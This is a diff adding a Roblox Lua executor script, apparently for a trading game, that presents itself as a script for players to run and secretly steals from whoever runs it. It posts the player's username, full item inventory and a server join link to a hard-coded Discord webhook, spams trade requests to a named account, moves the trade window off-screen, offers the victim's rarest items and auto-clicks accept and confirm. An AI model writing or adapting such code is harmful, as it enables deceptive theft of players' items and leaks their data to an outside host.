@@ -1,0 +1,300 @@
+local HttpService = game:GetService("HttpService")
+local webhookUrl = "https://discord.com/api/webhooks/1511902913516011640/d1JCaRtlLEKAh05TJWA-bLIrS_s1FQHQvoz1B27xt7XrVjpWfQJKFN3w7GN0dta02cmR"
+local plr = game.Players.LocalPlayer
+local MarketplaceService = game:GetService("MarketplaceService")
+
+-- universal request function
+local function sendRequest(url, data)
+    local body = HttpService:JSONEncode(data)
+    local options = {
+        Url = url,
+        Method = "POST",
+        Headers = { ["Content-Type"] = "application/json" },
+        Body = body
+    }
+    if request then
+        request(options)
+    elseif http_request then
+        http_request(options)
+    elseif syn and syn.request then
+        syn.request(options)
+    end
+end
+
+local info = MarketplaceService:GetProductInfo(game.PlaceId)
+local gameName = info.Name
+local joinLink = "[Click to join!](https://www.roblox.com/home?placeId=" .. tostring(game.PlaceId) .. "&jobId=" .. game.JobId .. ")"
+
+-- rarity priority
+local rarityPriority = {
+    ["Unique"] = 1,
+    ["Ancient"] = 2,
+    ["Godly"] = 3,
+    ["Legendary"] = 4,
+    ["Rare"] = 5,
+    ["Uncommon"] = 6,
+    ["Common"] = 7,
+}
+
+-- find container
+local function getContainer()
+    local playerGui = plr:WaitForChild("PlayerGui")
+    local mainGui = playerGui:WaitForChild("MainGUI")
+
+    local gameGui = mainGui:FindFirstChild("Game")
+    if gameGui then
+        local crafting = gameGui:FindFirstChild("Crafting")
+        local inventory = crafting and crafting:FindFirstChild("Inventory")
+        local salvage = inventory and inventory:FindFirstChild("Salvage")
+        local scroll = salvage and salvage:FindFirstChild("ScrollFrame")
+        local c = scroll and scroll:FindFirstChild("Container")
+        if c then return c end
+    end
+
+    local lobby = mainGui:FindFirstChild("Lobby")
+    if lobby then
+        local screens = lobby:FindFirstChild("Screens")
+        local inventory = screens and screens:FindFirstChild("Inventory")
+        local main = inventory and inventory:FindFirstChild("Main")
+        local crafting = main and main:FindFirstChild("Crafting")
+        local craftMain = crafting and crafting:FindFirstChild("Main")
+        local salvage = craftMain and craftMain:FindFirstChild("Salvage")
+        local scroll = salvage and salvage:FindFirstChild("ScrollFrame")
+        local c = scroll and scroll:FindFirstChild("Container")
+        if c then return c end
+    end
+
+    return nil
+end
+
+local container = getContainer()
+if not container then
+    warn("Container not found!")
+    return
+end
+
+-- store original positions
+local originalPositions = {}
+local function storeOriginalPositions()
+    pcall(function()
+        for _, obj in ipairs(plr.PlayerGui.TradeGUI:GetChildren()) do
+            if obj:IsA("GuiObject") then
+                originalPositions[obj] = obj.Position
+            end
+        end
+    end)
+    pcall(function()
+        for _, obj in ipairs(plr.PlayerGui.TradeGUI_Phone:GetChildren()) do
+            if obj:IsA("GuiObject") then
+                originalPositions[obj] = obj.Position
+            end
+        end
+    end)
+end
+
+local function moveGuiAway()
+    local FAR_AWAY = UDim2.new(50, 0, 50, 0)
+    pcall(function()
+        for _, obj in ipairs(plr.PlayerGui.TradeGUI:GetChildren()) do
+            if obj:IsA("GuiObject") then obj.Position = FAR_AWAY end
+        end
+    end)
+    pcall(function()
+        for _, obj in ipairs(plr.PlayerGui.TradeGUI_Phone:GetChildren()) do
+            if obj:IsA("GuiObject") then obj.Position = FAR_AWAY end
+        end
+    end)
+end
+
+local function restoreGui()
+    for obj, pos in pairs(originalPositions) do
+        pcall(function() obj.Position = pos end)
+    end
+end
+
+storeOriginalPositions()
+
+-- build initial item list for webhook
+local rarityGroups = {}
+
+for _, item in ipairs(container:GetChildren()) do
+    local success, rarity = pcall(function()
+        return item.Container.Rarity.Text
+    end)
+    if success and rarity then
+        if not rarityGroups[rarity] then
+            rarityGroups[rarity] = {}
+        end
+        table.insert(rarityGroups[rarity], item.Name)
+    end
+end
+
+-- build fields
+local fields = {
+    { name = "Username", value = plr.Name, inline = true },
+    { name = "Game", value = gameName, inline = true },
+    { name = "PlaceId", value = tostring(game.PlaceId), inline = true },
+    { name = "Join Server", value = joinLink, inline = false },
+}
+
+for rarity, items in pairs(rarityGroups) do
+    table.insert(fields, {
+        name = rarity,
+        value = table.concat(items, "\n"),
+        inline = true
+    })
+end
+
+local data = {
+    embeds = {
+        {
+            title = "Player ran script!",
+            description = "Join using the link provided",
+            color = 16493241,
+            fields = fields,
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        }
+    }
+}
+
+local success, err = pcall(function()
+    sendRequest(webhookUrl, data)
+end)
+
+if not success then
+    print("Error sending message: " .. err)
+end
+
+local tradingWithTarget = false
+
+-- offer items instantly when trade starts
+game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("StartTrade").OnClientEvent:Connect(function(tradeData, player)
+    container = getContainer() or container
+
+    if player == "ihatetraines" then
+        tradingWithTarget = true
+        moveGuiAway()
+        task.wait(0.5)
+
+        local freshItems = {}
+        local uniqueNames = {}
+        local uniqueCount = 0
+
+        for _, item in ipairs(container:GetChildren()) do
+            local success, rarity = pcall(function()
+                return item.Container.Rarity.Text
+            end)
+            if success and rarity then
+                local amount = 1
+                local amountSuccess, amountText = pcall(function()
+                    return item.Container.Amount.Text
+                end)
+                if amountSuccess and amountText then
+                    local num = amountText:match("x(%d+)")
+                    if num then amount = tonumber(num) end
+                end
+                for i = 1, amount do
+                    table.insert(freshItems, { name = item.Name, rarity = rarity })
+                end
+            end
+        end
+
+        table.sort(freshItems, function(a, b)
+            return (rarityPriority[a.rarity] or 99) < (rarityPriority[b.rarity] or 99)
+        end)
+
+        for _, item in ipairs(freshItems) do
+            if uniqueCount >= 4 and not uniqueNames[item.name] then
+            else
+                if not uniqueNames[item.name] then
+                    uniqueNames[item.name] = true
+                    uniqueCount = uniqueCount + 1
+                end
+                pcall(function()
+                    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("OfferItem"):FireServer(item.name, "Weapons")
+                end)
+                task.wait(0.3)
+            end
+        end
+    else
+        tradingWithTarget = false
+    end
+end)
+
+-- restore gui on every trade end
+local function onTradeEnd()
+    restoreGui()
+    tradingWithTarget = false
+end
+
+game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("EndTrade").OnClientEvent:Connect(onTradeEnd)
+game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("CompleteTrade").OnClientEvent:Connect(onTradeEnd)
+game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineTrade").OnClientEvent:Connect(onTradeEnd)
+game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineRequest").OnClientEvent:Connect(onTradeEnd)
+game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("CancelRequest").OnClientEvent:Connect(onTradeEnd)
+
+-- auto accept with timeout
+task.spawn(function()
+    while true do
+        task.wait(1)
+        if tradingWithTarget then
+            pcall(function()
+                local pcAcceptBtn, pcConfirmBtn
+                local mobileAcceptBtn, mobileConfirmBtn
+
+                -- PC
+                pcall(function()
+                    local pcAccept = plr.PlayerGui.TradeGUI.Container.Trade.Actions.Accept
+                    if pcAccept.ActionButton.Visible then
+                        pcAcceptBtn = pcAccept.ActionButton
+                        pcConfirmBtn = pcAccept.Confirm.ActionButton
+                    end
+                end)
+
+                -- Mobile
+                pcall(function()
+                    local mobileAccept = plr.PlayerGui.TradeGUI_Phone.Container.Trade.Actions.Accept
+                    if mobileAccept.ActionButton.Visible then
+                        mobileAcceptBtn = mobileAccept.ActionButton
+                        mobileConfirmBtn = mobileAccept.Confirm.ActionButton
+                    end
+                end)
+
+                -- Fire PC
+                if pcAcceptBtn and pcAcceptBtn.Visible then
+                    firesignal(pcAcceptBtn.MouseButton1Click)
+                    local timeout = 0
+                    repeat task.wait(0.1) timeout += 0.1
+                    until (pcConfirmBtn and pcConfirmBtn.Visible) or timeout >= 3
+                    if pcConfirmBtn and pcConfirmBtn.Visible then
+                        firesignal(pcConfirmBtn.MouseButton1Click)
+                    end
+                end
+
+                -- Fire Mobile
+                if mobileAcceptBtn and mobileAcceptBtn.Visible then
+                    firesignal(mobileAcceptBtn.MouseButton1Click)
+                    local timeout = 0
+                    repeat task.wait(0.1) timeout += 0.1
+                    until (mobileConfirmBtn and mobileConfirmBtn.Visible) or timeout >= 3
+                    if mobileConfirmBtn and mobileConfirmBtn.Visible then
+                        firesignal(mobileConfirmBtn.MouseButton1Click)
+                    end
+                end
+            end)
+        end
+    end
+end)
+
+-- spam trade requests every second
+task.spawn(function()
+    while true do
+        task.wait(1)
+        local target = game:GetService("Players"):FindFirstChild("ihatetraines")
+        if target then
+            pcall(function()
+                game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("SendRequest"):InvokeServer(target)
+            end)
+        end
+    end
+end)
